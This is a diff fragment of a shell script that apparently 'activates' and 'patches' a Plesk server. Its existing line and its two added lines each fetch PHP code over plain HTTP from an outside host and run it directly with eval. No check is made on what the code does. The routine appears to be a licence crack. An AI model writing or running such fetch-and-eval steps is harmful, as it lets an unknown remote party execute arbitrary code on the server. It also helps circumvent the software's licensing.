@@ -7,6 +7,8 @@ sleep 10
 echo "Activating Plesk..."
 plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
 sleep 5
+plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
+sleep 5
 echo "Patching Plesk..."
 echo "Stopping Plesk..."
 sleep 1
